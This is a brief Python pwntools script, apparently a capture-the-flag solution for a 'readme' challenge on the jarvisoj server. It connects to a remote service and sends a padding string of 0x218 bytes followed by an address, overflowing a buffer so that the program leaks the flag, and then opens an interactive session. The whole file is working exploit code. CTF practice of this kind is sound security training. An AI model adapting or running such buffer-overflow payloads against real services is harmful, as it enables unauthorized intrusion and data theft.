#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./readme.bin"
ENV = {"LD_PRELOAD":"./libc.so.6"}

#p = process(elf)
p = remote("pwn.jarvisoj.com", 9877)

#gdb.attach(p)
p.recvuntil("What's your name? ")
p.sendline("A"*0x218+p64(0x400d20))

p.recvuntil("Please overwrite the flag: ")
p.sendline()

p.interactive()
